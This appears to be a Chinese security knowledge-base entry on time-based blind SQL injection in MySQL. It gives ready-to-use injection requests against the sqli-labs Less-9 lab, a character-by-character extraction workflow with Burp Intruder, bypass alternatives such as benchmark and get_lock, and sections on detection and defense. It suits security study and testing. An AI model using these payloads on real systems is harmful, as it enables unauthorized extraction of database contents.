---
id: web-generic-sqli-time-blind-if-sleep-intruder
title: MySQL 时间盲注标准流程：if(条件,sleep(N),1) 造延时 + Intruder 响应时间排序筛字符
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-time-blind-extraction-workflow
aliases:
- 时间盲注流程
- if sleep 盲注
- 延时注入
- 响应时间盲注
- sleep 逐字符爆破
tags:
- sqli
- blind
- time-based
- mysql
- sleep
- intruder
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V554
  verified_at: '2026-11-12T00:17:51+08:00'
  notes: 已对照原文与图41-45核对：if(条件,sleep,回显)原理图；不闭合请求load 108ms、闭合 and sleep(5)--+ load 5.11s；if(length(database())=8,sleep(5),1) 5.11s；延时调15秒后Intruder响应完成列按时间排序（15005-15028ms vs 35-1086ms）均一致。二分定长为通用补充，原文仅直接演示=8验证。dedup除自身外候选为过滤绕过（CASE/BENCHMARK/GET_LOCK）、笛卡尔积、HPP、隐藏参数等变体，非同一条链；dup-scan无相关pair。原文未给组件版本，未设affected_versions；PoC未在本机执行。
---

## 一句话结论

当页面连「真/假」两种状态都不给（内容、长度、状态码完全一致）时，用 `if(条件,sleep(N),1)` 把条件真值编码为响应时间：条件为真则数据库睡眠 N 秒、页面延迟回显，为假则立即返回；先 `and sleep(5)` 确认闭合，再二分定长、`substr` 逐字符枚举，在 Burp Intruder 结果里按「响应完成时间」排序，耗时明显更长的那一行就是正确字符。

## 原理

- **时间作为唯一信道**：SQL 的 WHERE 条件真值不影响响应内容时，仍可通过数据库函数主动消耗时间；`sleep(N)` 在查询执行期间阻塞 N 秒，网络面板/Intruder 的响应时间可直接观测。
- **if 分支编码**：`if(cond, sleep(5), 1)`——cond 为真执行 `sleep(5)` 产生延迟，为假执行常量 1 立即返回；这是标准的一比特 oracle。
- **闭合判断**：`?id=1' and sleep(5) --+` 若延迟 5 秒说明单引号闭合成立；不加注释/引号不闭合时立即返回（示例不含 `--+` 的版本延迟仅 108ms）。
- **二分与枚举**：`if(length(database())=8,sleep(5),1)` 定长；`if(substr(database(),1,1)='a',sleep(15),1)` 逐字符爆破；把延时调大到 10-15 秒可降低网络抖动误判，Intruder 的「响应完成」列按时间排序即可读出字符。
- **与布尔盲注的区别**：观测通道从页面内容变为时间，适合更严格的回显环境；代价是每次判断都要等待延时，速度更慢，通常配合二分法减少请求数。

## 触发条件

- 存在 SQL 注入，页面无回显、无布尔差异、无数据库错误。
- `sleep()`、`if()` 未被禁用或过滤（被过滤时可换 `benchmark()`、`get_lock()`、笛卡尔积等替代原语）。
- 数据库执行时间可被外部稳定观测（无中间缓存/超时截断）。
- 请求超时阈值大于所用延时（否则连接被断开需调小 N）。

## 利用步骤

1. `?id=1' and sleep(5) --+` 与 `?id=1' and sleep(5)` 对比：前者延迟 5 秒，确认单引号闭合与注入存在。
2. 用二分法 `if(length(database())>5,sleep(5),1)`、`>10`、`=8` 确定库名长度。
3. `if(substr(database(),1,1)='a',sleep(15),1)` 配合 Burp Intruder 字典逐字符爆破；在结果表增加「响应完成」列，按时间排序筛出正确字符。
4. 表名、字段名、数据内容按与布尔盲注相同的层级（个数、长度、逐字符）重复，只把 oracle 换成 `if(...,sleep(N),1)`。
5. 若 `sleep` 被过滤，改用 `benchmark(10000000,md5(1))`、`get_lock('x',N)`（需另一连接持锁）或大笛卡尔积查询造延时。

## PoC

```http
# 闭合确认：满足闭合时延迟 5 秒；不满足时约 100ms 返回
GET /Less-9/?id=1' and sleep(5) --+ HTTP/1.1
GET /Less-9/?id=1' and sleep(5) HTTP/1.1

# 库名长度=8 时延迟 5 秒
GET /Less-9/?id=1' and if(length(database())=8,sleep(5),1)--+ HTTP/1.1

# 第一位字符：延时调为 15 秒，Intruder 按响应完成时间排序，耗时最长者为正确字符
GET /Less-9/?id=1' and if(substr(database(),1,1)='a',sleep(15),1)--+ HTTP/1.1
```

响应本身无差异，仅在浏览器网络面板/Intruder 的耗时列可见 5 秒或 15 秒延迟（示例：不闭合 108ms，闭合 5.11s）。

## 变体与关联

- 变体：`benchmark(次数,表达式)` 用 CPU 消耗替代 sleep；`get_lock('name',timeout)` 在另一连接占锁时产生等待；被过滤 `sleep/if/and/=` 时可用笛卡尔积大表查询或 `LIKE`/`CASE WHEN` 重建（[[web-generic-sqli-cartesian-product-time-blind]]、[[web-generic-sqli-blind-filter-bypass-functions]]）。
- 变体：MSSQL 用 `WAITFOR DELAY '0:0:5'`，PostgreSQL 用 `pg_sleep(5)`，Oracle 用 `dbms_lock.sleep(5)`。
- 关联：页面有真假差异时优先布尔盲注（[[web-generic-sqli-boolean-blind-length-substr-intruder]]）；有错误回显时用报错注入（[[web-generic-sqli-error-based-extraction]]）；完全无回显且可出网时用 DNS 带外（[[web-generic-sqli-dnslog-oob-exfiltration]]）。
- 边界：延时注入受网络抖动、缓存、超时设置影响，需多次复测；请求量大且每次带延时，容易被速率限制与超时告警发现。

## 检测与防御

- 修复：参数化查询/预编译；数据库账号最小权限。
- 加固：设置查询超时（小于攻击者可用的延时阈值）、页面/网关统一响应时间；WAF 拦截 `sleep(`、`benchmark(`、`get_lock(`、`if(` 与子查询组合；限制单 IP 请求频率。
- 检测：数据库慢查询日志中出现 `sleep/benchmark` 或执行时间精确等于参数值的查询；同一参数高频请求且响应时间呈「正常/固定延时」两簇；网络层识别延时盲注的周期性长时间连接。
